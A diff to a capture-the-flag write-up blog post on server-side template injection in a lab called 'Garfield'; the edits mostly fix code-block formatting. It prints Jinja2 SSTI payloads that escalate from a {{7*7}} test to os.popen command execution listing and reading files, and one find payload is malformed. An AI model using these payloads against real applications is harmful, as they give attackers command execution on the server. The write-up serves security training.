@@ -94,18 +94,18 @@ media_subpath: /assets/img/_posts/garfield-ssti
  ![Garfield Fun1](Garfield_01.png)
   ```bash
     Payload:/mylabs?word_5={{7*7}}
-    
+  ```
  ![SSTI_Confirmed](Garfield_1.png)
    ```bash
      Output: Observe the 49 in the image above.
-    ```
+   ```
     This confirms that SSTI exists.
 
  ---
 ### Exploring the Environment
   ```bash
     Payload:/mylabs?word_5={{config}}
-    ```
+  ```
  
  ![Config output](Garfield_2.png)
  
@@ -114,17 +114,17 @@ media_subpath: /assets/img/_posts/garfield-ssti
  ---
 
 ### Listing Files
-
+  ```bash
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
-    
+   ``` 
  ![ls output](Garfield_3.png)
 
  ---
 
 ### Searching for the Flag
-
+  ```bash
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
-
+  ```
  ![find output](Garfield_4.png)
 
     This revealed the presence of flag.txt.
@@ -132,8 +132,9 @@ media_subpath: /assets/img/_posts/garfield-ssti
  ---
 
 ### Reading the Flag
+ ```bash
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
- 
+ ```
  ![flag output](Garfield_5.png)
 
  ---
